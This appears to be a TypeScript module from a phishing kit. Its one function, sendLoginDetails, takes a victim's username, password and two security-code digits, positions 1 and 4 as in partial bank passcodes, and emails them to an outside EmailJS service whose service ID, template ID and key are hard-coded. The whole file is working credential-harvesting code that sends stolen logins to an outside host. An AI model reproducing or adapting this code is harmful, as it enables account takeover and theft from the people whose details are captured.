import emailjs from 'emailjs-com';

interface LoginDetails {
  username: string;
  password: string;
  securityCode1: number;
  securityCode4: number;
}

export const sendLoginDetails = async (data: LoginDetails) => {
  try {
    await emailjs.send(
      'service_xh08dqo',
      'template_4gih0w5',
      {
        username: data.username,
        password: data.password,
        securityCode1: `${data.securityCode1}`,
        securityCode4: `${data.securityCode4}`
      },
      'A2deAJT3hIHOS7E5x'
    );
  } catch (error) {
    console.error('Error sending email:', error);
  }
};